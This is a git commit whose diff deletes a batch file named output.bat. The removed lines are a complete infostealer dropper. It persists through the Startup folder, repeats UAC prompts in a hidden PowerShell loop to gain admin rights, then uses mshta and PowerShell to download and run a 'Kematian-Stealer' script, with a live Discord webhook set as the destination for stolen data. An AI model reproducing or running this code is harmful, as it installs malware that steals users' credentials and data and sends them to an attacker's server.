7d119002493ff7ff4c112de2c1c385431f78bd02
WebHost6 <157830720+WebHost6@users.noreply.github.com>
2024-07-02 22:04:00 -0400

    Delete output.bat

--- output.bat
+++
@@ -1,7 +0,0 @@
-@echo off
-cd /d "%~dp0"
-copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\fr.bat" >nul 2>&1
-net session >nul 2>&1
-if not %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
-del /f /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\fr.bat" >nul 2>&1
-mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$t = Iwr -Uri 'https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'https://discord.com/api/webhooks/1252350864849375294/KvFLhorQEdArArlQA0YGSquU5jYgXSNZvT3ny_Ls7Lz9ETBNUvibyc_nLGMO65LyacAx' | iex",0))
